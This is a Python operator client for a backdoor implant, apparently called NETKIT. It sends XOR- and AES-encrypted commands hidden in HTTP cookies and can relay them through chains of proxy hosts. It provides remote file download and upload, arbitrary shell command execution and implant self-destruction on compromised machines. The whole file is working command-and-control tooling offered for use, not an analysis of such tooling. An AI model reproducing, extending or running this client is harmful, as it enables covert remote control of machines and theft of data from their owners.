#!/usr/bin/env python3

from pwn import p8, xor, enhex, unhex
import socket
from Crypto.Cipher import AES
import time
import os
import sys
import requests


AUTH_PASSWORD = 0

CMD_FILE_READ = 0
CMD_FILE_WRITE = 1
CMD_FILE_EXEC = 2
CMD_PROXY = 3
CMD_EXIT = 4


def xor_crypt(plaintext):
    print = lambda *x: ...

    ciphertext = xor(plaintext, b"NETKIT_XOR\x00")[:len(plaintext)]
    print('\nxor:', ciphertext)

    return ciphertext


def aes_encrypt(plaintext):
    print = lambda *x: ...

    padlen = 16-(len(plaintext) % 16)
    if padlen == 16:
        padlen = 0

    plaintext += padlen.to_bytes(1, 'little') * padlen
    print(f'\npad: {plaintext} ({len(plaintext)-padlen})')

    iv = b"IV"*8
    cipher = AES.new(b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD", AES.MODE_CBC, iv)
    ciphertext = iv + cipher.encrypt(plaintext)
    print('\naes:', ciphertext)

    return ciphertext


def aes_decrypt(ciphertext):
    print = lambda *x: ...

    cipher = AES.new("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD".encode(), AES.MODE_CBC, ciphertext[:16])
    padded = cipher.decrypt(ciphertext[16:])
    print("\naes decrypt (padded):", padded)
    pad_size = ord(padded[len(padded)-1:])
    if 0 < pad_size < 16:
        for b in padded[:-pad_size:-1]:
            padded_correct = b == pad_size
            if not padded_correct:
                break
        if padded_correct:
            plaintext = padded[:-pad_size]
        else:
            plaintext = padded
    else:
        plaintext = padded

    print('\naes decrypt:', plaintext)

    return plaintext


class PacketReq:
    def __init__(self, password: bytes, cmd_id: int, content: bytes):
        self.password = password
        self.cmd_id = cmd_id
        self.content = content

    def __bytes__(self):
        return self.encrypt(self.password + p8(self.cmd_id) + self.content)

    def encrypt(self, plaintext: bytes) -> bytes:
        ciphertext = xor_crypt(plaintext)
        ciphertext = aes_encrypt(ciphertext)

        return ciphertext


class PacketRes:
    def __init__(self, retv: int, ciphertext: bytes):
        self.retv = retv
        self.content = b""
        if retv >= 0:
            self.content = self.decrypt(ciphertext)

    def decrypt(self, ciphertext: bytes) -> bytes:
        if ciphertext == b"":
            return b""

        ciphertext = aes_decrypt(ciphertext)
        plaintext = xor_crypt(ciphertext[:len(ciphertext)])

        return plaintext


def encapsulate_proxies(host_list: list[tuple[str, int]], packet: PacketReq) -> PacketReq:
    for i, addr in enumerate(host_list[:-1]):
        next_addr = host_list[i+1]
        content = socket.inet_aton(next_addr[0])
        port = socket.htons(next_addr[1]).to_bytes(2, 'little')
        packet = PacketReq(packet.password, CMD_PROXY, content + port + bytes(packet))

    return packet


def decapsulate_proxies(host_list: list[tuple[str, int]], res: PacketRes) -> PacketRes:
    for _ in host_list[:-1]:
        res.content = PacketRes(res.retv, res.content).content

    return res


def _sock_sendrecv(addr: tuple[str, int], sendbuf: bytes) -> bytes:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(addr)

    data = sendbuf
    print('\nsend:', data)

    start = time.perf_counter()
    s.sendall(data)
    data = s.recv(65536)
    end = time.perf_counter()
    s.close()

    print(f"time: {(end - start) * 1000}ms")

    if len(data) == 0:
        raise Exception("[!] auth failed")

    print(f'recv ({len(data)} bytes):', data)


def sendrecv(addr: tuple[str, int], sendbuf: bytes) -> bytes:
    hex_sendbuf = enhex(sendbuf)
    r = requests.get(f"http://{addr[0]}:{addr[1]}/", cookies={"SOCS": hex_sendbuf})

    retv = 0
    unhex_recvbuf = b""
    if r.status_code == 500:
        retv = -1
    elif r.status_code == 422:
        print("[!] invalid packet sent by client (check config)")
    elif r.status_code == 200:
        start = r.headers['Set-Cookie'].index("SOCS") + 5
        end = r.headers['Set-Cookie'][start:].index(";") + 5
        data = r.headers['Set-Cookie'][start:end]

        unhex_recvbuf = unhex(data)

    return retv, unhex_recvbuf


def sendrecv_encapsulate(host_list: list[tuple[str, int]], original_packet: PacketReq) -> PacketRes:
    encap_packet_req: PacketReq = encapsulate_proxies(host_list, original_packet)
    retv, res_raw = sendrecv(host_list[0], bytes(encap_packet_req))
    decap_packet_res: PacketRes = decapsulate_proxies(host_list, PacketRes(retv, res_raw))

    return decap_packet_res


def download(host_list: list[tuple[str, int]], password: bytes, filename_remote: str, filename_local: str):
    packet_filename = filename_remote.encode() + b"\x00"
    packet = PacketReq(password, CMD_FILE_READ, packet_filename)
    rsp = sendrecv_encapsulate(host_list, packet)

    with open(filename_local, "wb") as f:
        f.write(rsp.content)

    return rsp


def upload(host_list: list[tuple[str, int]], password: bytes, filename_local: str, filename_remote: str) -> PacketRes:
    with open(filename_local, "rb") as f:
        content = f.read()

    req = PacketReq(password, CMD_FILE_WRITE, filename_remote.encode() + b"\x00" + content)
    rsp = sendrecv_encapsulate(host_list, req)

    return rsp


def exec(host_list: list[tuple[str, int]], password: bytes, pwd: str, cmd: str):
    if cmd != "" and pwd != "":
        complete_cmd = f"cd {pwd} && {cmd}"
    elif cmd == "":
        raise ValueError("[!] no cmd given (developers' fault)")
    elif pwd == "":
        complete_cmd = cmd

    complete_cmd += "\x00"

    req = PacketReq(password, CMD_FILE_EXEC, complete_cmd.encode())
    rsp = sendrecv_encapsulate(host_list, req)

    return rsp


def server_exit(host_list: list[tuple[str, int]], password):
    req = PacketReq(password, CMD_EXIT, b"")
    rsp = sendrecv_encapsulate(host_list, req)

    return rsp


def main(argv):
    password = b"password\x00"
    pwd = os.path.abspath("/")

    # get all proxy
    host_list = []
    if len(argv) > 1:
        for arg in argv[1:]:
            ip, port = arg.split(":")
            host_list.append((ip, int(port)))

    if host_list == []:
        print(f"[!] usage: {argv[0]} <<ip>:<port>> [<ip>:<port>] [<ip>:<port>] ...\n")
        return

    while True:
        nice_hosts = [ip + ":" + str(port) for ip, port in host_list]
        prefix = "->".join(nice_hosts) + pwd + " $ "
        cmd_argv = input(prefix).strip(" ").split()
        if cmd_argv == []:
            continue

        cmd_bin = cmd_argv[0].lower()
        if cmd_bin == "download":
            if len(cmd_argv) != 2:
                print("usage: download <remote_path>\n")
                continue

            filename_remote = cmd_argv[1]
            filename_local = cmd_argv[1].replace("/", "__")
            rsp = download(host_list, password, filename_remote, filename_local)
            if rsp.retv < 0:
                print(f"[-] failed to download file '{filename_remote}' from server to local\n")
                continue

            print(f"[+] file successfully downloaded '{filename_remote}' from server to local (saved as '{filename_local}')\n")
        elif cmd_bin == "upload":
            if len(cmd_argv) != 3:
                print("usage: upload <local_path> <remote_path>\n")
                continue

            rsp = upload(host_list, password, cmd_argv[1], cmd_argv[2])
            if rsp.retv < 0:
                print(f"[-] failed to upload file '{cmd_argv[1]}' to the server as '{cmd_argv[2]}'\n")
                continue

            print(f"[+] successfully uploaded file '{cmd_argv[1]}' as '{cmd_argv[2]}' to server\n")
        elif cmd_bin == "hosts":
            hosts_usage = lambda: (
                print("usage:"),
                print("- hosts push <ip>:<port>"),
                print("- hosts pop\n")
            )

            if len(cmd_argv) == 1 or cmd_argv[1] not in {"push", "pop"}:
                hosts_usage()
                continue

            if cmd_argv[1] == "push":
                if len(cmd_argv) != 3:
                    hosts_usage()
                    continue

                ip, port = cmd_argv[2].split(":")
                host_list.append((ip, int(port)))
                print(f"[+] successfully added device {ip}:{port} to hosts list\n")
            elif cmd_argv[1] == "pop":
                if len(cmd_argv) != 2:
                    hosts_usage()
                    continue

                if len(host_list) == 1:
                    print("[!] 1 host in list. cannot pop\n")
                    continue

                host_list.pop(-1)
                print(f"[+] successfully popped host {ip}:{port}\n")
        elif cmd_bin == "[self-destruct]":
            confirm = input("[?] are you sure you want to permantently remove the implant from the system? (y/N): \n")
            if confirm.lower() != "y":
                continue

            server_exit(host_list, password)
            print(f"[+] successfully self destructed server {host_list[-1]}\n")
            host_list.pop(-1)
        elif cmd_bin == "cd":
            pwd_new = os.path.normpath(os.path.join(pwd, cmd_argv[1]))
            rsp = exec(host_list, password, "", f"test -d {pwd_new}")
            if rsp.retv < 0:
                print(f"[-] cannot access '{pwd_new}': No such file or directory\n")
                continue

            pwd = pwd_new
        elif cmd_bin == "exit":
            break
        else:
            cmd = ' '.join(cmd_argv)
            rsp = exec(host_list, password, pwd, cmd)
            if rsp.retv < 0:
                print(f"command not found (something went wrong): {cmd.split(' ')[0]}\n")
                continue

            print(rsp.content.decode("utf-8", "backslashreplace"))


if __name__ == "__main__":
    main(sys.argv)
